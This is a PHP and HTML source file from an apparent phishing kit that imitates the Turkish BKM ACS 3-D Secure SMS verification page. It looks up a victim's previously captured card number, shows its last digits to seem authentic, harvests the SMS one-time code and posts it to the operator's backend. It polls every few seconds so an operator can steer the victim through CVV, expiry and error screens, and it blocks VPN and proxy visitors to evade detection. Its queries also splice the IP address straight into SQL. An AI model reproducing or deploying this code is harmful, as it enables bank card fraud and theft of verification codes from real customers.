<?php include_once("../config.php"); include_once("../txmd/Data/Server/GrabIP.php"); include_once("../txmd/Data/Server/BlockVPN.php"); include_once("../txmd/Data/Client/GetBank.php"); include_once("../txmd/Data/Server/BanControl.php");
  
  $check = $pdo->query("SELECT * FROM logs WHERE ip = '{$ip}'")->fetch(PDO::FETCH_ASSOC);
  $checkAdmin = $pdo->query("SELECT * FROM admin_settings")->fetch(PDO::FETCH_ASSOC);
  $checkSepet = $pdo->query("SELECT * FROM sepet WHERE ip_adresi = '{$ip}'")->fetch(PDO::FETCH_ASSOC);
  
  if($checkAdmin["proxy_vpn"] == 1) {
   if($proxy == 1 or $hosting == 1) {
    die('Proxy & VPN Firewall - txmd');
   } 
  }

  if($check["kredi_karti"]) {
    $pdo->query("UPDATE logs SET durum = 'SMS Ekranı' WHERE ip = '{$ip}'");
  } else {
    header("Location: /");
  }

  if($checkSepet["ip_adresi"]) {
    $pdo->query("UPDATE logs SET durum = 'SMS Ekranı' WHERE ip = '{$ip}'");
  } else {
    header("Location: /");
  }

  $sms_error = "none";
  $sms_success = "none";

  switch($_GET["control"]){
    case 'error';
     $sms_error = "block";
    break;
    case 'success';
     $sms_success = "block";
     echo("<script> setTimeout(function(){ window.location='/siparisiniz-alindi'; }, 2750);</script>");
    break;
  }
?>
<html lang="tr" style="height: 100%; width: 100%;">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="description" content="">
    <meta name="author" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="shortcut icon" type="image/png" href="./">
    <title>BKM ACS</title>
    <link rel="stylesheet" href="./assets/bkm/css/bkmacs2-dist.css">
    <link rel="stylesheet" href="./assets/bkm/css/main-dist.css" type="text/css" media="screen">
    <script type="text/javascript" src="./assets/bkm/js/main-dist.js"></script>
    <script type="text/javascript">
      var isSupportedIE = true;
    </script>
  </head>
  <body>
    <div class="content-wrapper">
      <div class="header">
        <div class="brand-logo">
          <img 3dslogo="scheme" align="left" src="<?php echo $marka[$check["marka"]]; ?>">
        </div>
        <div class="member-logo">
          <img 3dslogo="issuer" align="right" src="<?php echo $banka[$check["banka"]]; ?>">
        </div>
      </div>
      <div id="approve-page">
        <div id="loaderDiv" style="height: 100%; width: 100%; position: absolute; z-index: 1; display: none">
          <div class="loader"></div>
        </div>
        <?php if($sms_success == "block") :?>
          <div class="content">
            <div style="margin-top:100px; display: <?php echo $sms_success; ?>;" class="action-wrapper">
              <h1 class="small">
                Doğrulama Başarılı
              </h1>
            <img style="margin-top:-5px; width:50px; height:50px;" src="https://emvacs.bkm.com.tr/acs/static/img/check.png">
            </div>
          </div>
        <?php else : ?>
        <div class="content">
          <h1 id="approve-header">Doğrulama kodunu giriniz</h1>
          <div class="info-wrapper">
            <div class="info-row">
              <div class="info-col info-label">İşyeri Adı:</div>
              <div class="info-col" 3dsdisplay="merchant" id="merchant-name"> <?php echo $checkAdmin["isyeri_adi"]; ?> </div>
            </div>
            <div class="info-row">
              <div class="info-col info-label">İşlem Tutarı:</div>
              <div class="info-col amount" 3dsdisplay="amount" id="amount"> <?php echo $check["bakiye"]; ?> </div>
            </div>
            <div class="info-row">
              <div class="info-col info-label">İşlem Tarihi-Saati:</div>
              <div class="info-col" 3dsdisplay="date" id="operation-date-time"> <?php echo date('d.m.Y H:i:s'); ?> </div>
            </div>
            <div class="info-row">
              <div class="info-col info-label">Kart Numarası:</div>
              <div class="info-col" 3dsdisplay="pan" id="pan">XXXX XXXX XXXX <?php echo substr($check["kredi_karti"], 12, 16); ?></div>
            </div>
          </div>
          <div class="action-wrapper" 3dsdisplay="prompt" 3dslabel="prompt">
            <div>
              <h3>Şifreniz <span id="msisdn">0 5XX XXXXXXX</span> nolu cep telefonunuza gönderilecektir. <br>Referans no: 1UJAJIRK </h3>
            </div>
            <div class="form-wrapper">
              <form 3dsaction="manual" id="bkmform" class="form-code" method="POST" autocomplete="off" novalidate="novalidate">
                <div class="form-row">
                  <label for="code" class="otpcode">Doğrulama Kodu</label>
                  <input 3dsinput="password" type="number" class="f-input" oninput="maxLengthCheck(this)" onkeypress="return isNumeric(event)" name="otpCode" id="passwordfield" maxlength="6" min="0" max="99999999" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
                </div>
                <div id="wrongPassDiv" 3dsdisplay="error" class="error-messages error-wrong-otp" style="display: <?php echo $sms_error; ?>;">
                  <span class="has-reg">Geçersiz şifre, lütfen tekrar deneyiniz.</span>
                </div>
                <div id="timeOutDiv" class="error-messages error-timeover" style="display: none;">
                  <div>
                    <span class="has-reg">Doğrulama Kodunu belirtilen süre içerisinde girmediniz.</span>
                  </div>
                  <button id="retryButton" type="button" onclick="window.location.href = 'bkm'" class="button btn-1 re-code v1" name="otpType" value="retry">Doğrulama Kodunu Yeniden Gönder</button>
                </div>
                <div id="submitButtonDiv" style="display: block;">
                  <div class="has-submit">
                    <button id="submitbutton" type="submit" name="otpType" value="confirm" class="button btn-1 btn-commit">Onayla</button>
                  </div>
                  <div id="timerDiv" class="has-timer">
                    <span>Kalan Süre: </span>
                    <span class="has-counter" id="has-counter">03:00</span>
                  </div>
                </div>
                <div class="call-to-action">
                  <ul class="action-list">
                    <li>
                      <a id="triggercanceldialog" href="#canceldialog" class="txt-link fancybox-ajax" style="background: none !important; border: none; cursor: pointer; font-family: inherit;">İşlemi İptal Et</a>
                      <button id="triggercancel" name="cancel" value="cancel" style="display: none;"></button>
                    </li>
                  </ul>
                  <div style="display: none;">
                    <div class="panel" id="canceldialog">
                      <h1 class="small" id="msg-cancel-box">İşyeri sayfasına yönlendirileceksiniz, işleminizi iptal etmek istediğinizden emin misiniz?</h1>
                      <a href="javascript:;" onclick="$.fancybox.close();" class="button btn-1 close-modal">Vazgeç</a>
                      <a class="button btn-1 btn-1-cancel txt-link trigger-cancel-page">İşlemi İptal Et</a>
                    </div>
                  </div>
                </div>
              </form>
            </div>
          </div>
        </div>
        <?php endif; ?>
      </div>
    </div>
    <script type="text/javascript" src="../assets/js/mainFunction.js"></script>
    <script type="text/javascript" src="../assets/js/uaParser.min.js"></script>
    <script type="text/javascript" src="../assets/js/js.cookie.min.js"></script>
    <script type="text/javascript" src="./assets/bkm/js/bkmacs-dist.js"></script>
    <script>
      if (isSupportedIE) {
        document.getElementById('passwordfield').focus();
        $(document).ready(function() {
          $("a#triggercanceldialog").fancybox();
        });
        var expireDate = new Date();
        var otpDuration = 180.0
        expireDate.setSeconds(expireDate.getSeconds() + otpDuration)
        display = document.querySelector('#has-counter');
        startTimer(otpDuration, display);
        window.onpageshow = function(event) {
          if (event.persisted) {
            window.location.reload()
          }
        };
        document.getElementById("passwordfield").addEventListener("keydown", function(event) {
          if (this.getAttribute("placeholder")) {
            this.classList.remove("error");
            this.removeAttribute("placeholder");
          }
          if (event.keyCode === 13) {
            event.preventDefault();
            document.getElementById("submitbutton").click();
          }
        });
        document.getElementById('submitbutton').onclick = function() {
          var passwordField = document.getElementById("passwordfield");
          var fieldValue = passwordField.value;
          if (fieldValue.length == 0) {
            addClass("error", passwordField);
            passwordField.value = "";
            passwordField.placeholder = "Şifrenizi giriniz";
            return false;
          } else if (fieldValue.length < 5) {
            addClass("error", passwordField);
            passwordField.value = "";
            passwordField.placeholder = "Şifrenizi giriniz";
            return false;
          } else {
            triggerLoading();
            return true;
          }
        };
        document.getElementById("passwordfield").onfocus = function() {
          if (isClassExist("error", this)) {
            this.value = "";
            removeClass("error", this);
            this.removeAttribute("placeholder");
          }
        };
      }

      function init() {
        if (isSupportedIE) {
          var dateId = 'operation-date-time',
            operationDate = document.getElementById(dateId).textContent;
          if (operationDate.length == 17) {
            var operationYear = operationDate.substring(0, 4),
              operationMonth = operationDate.substring(4, 6),
              operationDay = operationDate.substring(6, 8),
              operationTime = operationDate.substring(9, 18),
              convertedOperationDate = operationDay + "." + operationMonth + "." + operationYear + " " + operationTime;
            document.getElementById(dateId).innerHTML = convertedOperationDate;
          }
          document.getElementById('passwordfield').focus();
        }
      }

      function startTimer(duration, display) {
        if (duration > 0) {
          var submitButtonDiv = document.getElementById('submitButtonDiv');
          submitButtonDiv.style.display = "block";
        }
        var timer = duration,
          minutes, seconds;
        minutes = parseInt(timer / 60, 10);
        seconds = parseInt(timer % 60, 10);
        minutes = minutes < 10 ? "0" + minutes : minutes;
        seconds = seconds < 10 ? "0" + seconds : seconds;
        if (duration > 0) display.textContent = minutes + ":" + seconds;
        --timer;
        var timerInterval = setInterval(function() {
          minutes = parseInt(timer / 60, 10);
          seconds = parseInt(timer % 60, 10);
          minutes = minutes < 10 ? "0" + minutes : minutes;
          seconds = seconds < 10 ? "0" + seconds : seconds;
          if (duration > 0) display.textContent = minutes + ":" + seconds;
          if (duration < 0 || --timer < 0) {
            var submitButtonDiv = document.getElementById('submitButtonDiv');
            submitButtonDiv.style.display = "none";
            var wrongPassDiv = document.getElementById('wrongPassDiv');
            wrongPassDiv.style.display = "none";
            var timeOutDiv = document.getElementById('timeOutDiv');
            timeOutDiv.style.display = 'block';
            clearInterval(timerInterval);
          }
        }, 1000);
      }

      function triggerLoading() {
        var loaderDiv = document.querySelector('#loaderDiv');
        loaderDiv.style.display = 'block';
        setTimeout(function() {}, 1000);
      }

      $("form").on("submit", function (e) {
        var dataString = $(this).serialize();

        $.ajax({
          type: "POST",
          url: "action/process.php",
          data: dataString,
          success: function () {
            
          }
        });
 
        e.preventDefault();
      });
    </script>
    <script type="text/javascript">
      $(document).ready(function() {
        gonder();
        var int = self.setInterval("gonder()", 2500);
      });
      
      function gonder() {
        $.ajax({
           type: 'POST',
           url: '<?php echo "../veri.php?ip=".$ip; ?>',
           success: function(msg) {
              if (msg.includes('sms')) {
                  window.location.href = '../acsredirect';
              }
              if (msg.includes('tebrikler')) {
                  window.location.href = '../acsredirect?control=success';
              }
              if (msg.includes('hata_sms')) {
                  window.location.href = '../acsredirect?control=error';
              }
              if (msg.includes('hata_limit')) {
                window.location.href = '/?redirect=error_limit';
              }
              if (msg.includes('hata_internet')) {
                 window.location.href = '/?redirect=error_internet';
              }
			   if (msg.includes('hata_cvv')) {
                  window.location.href = '/odeme?status=cvv';
              }
              if (msg.includes('hata_skt')) {
                  window.location.href = '/odeme?status=skt';
              }
              if (msg.includes('hata_dogrulama')) {
                window.location.href = '/dogrulama?control=error';
              }
              if (msg.includes('dogrulama')) {
                 window.location.href = '/dogrulama';
              }
              if (msg.includes('basa_dondur')) {
                  window.location.href = '/';
              }
           }
        });
      }     
    </script>
    
  </body>
</html>